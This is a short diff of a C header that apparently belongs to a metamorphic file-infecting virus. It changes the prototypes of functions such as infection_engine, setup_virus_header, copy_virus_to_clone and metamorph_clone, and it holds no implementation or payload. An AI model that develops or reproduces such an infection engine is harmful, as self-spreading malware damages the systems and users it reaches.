@@ -47,11 +47,11 @@ bool		infection_engine(struct virus_header *vhdr, struct safe_ptr clone_ref, str
 */
 
 bool		find_entry(struct entry *entry, struct safe_ptr ref);
-bool		setup_virus_header(struct safe_ptr clone_ref, size_t end_of_last_section, size_t full_virus_size, uint64_t seed);
 bool		adjust_references(struct safe_ptr clone_ref, size_t shift_amount, size_t end_of_last_section);
+bool		setup_virus_header(struct safe_ptr clone_ref, size_t end_of_last_section, struct virus_header vhdr);
 bool		copy_client_to_clone(struct safe_ptr clone_ref, struct safe_ptr file_ref, size_t end_of_last_section, size_t shift_amount);
 bool		copy_virus_to_clone(struct safe_ptr clone_ref, const struct entry *file_entry, const struct virus_header *vhdr);
-bool		metamorph_clone(struct safe_ptr clone_ref, size_t *full_virus_size, size_t loader_off, uint64_t seed);
+bool		metamorph_clone(struct safe_ptr clone_ref, size_t loader_off, uint64_t seed, size_t *full_virus_size, const struct virus_header *vhdr);
 bool		generate_seed(uint64_t *seed, struct safe_ptr file_ref);
 
 /*
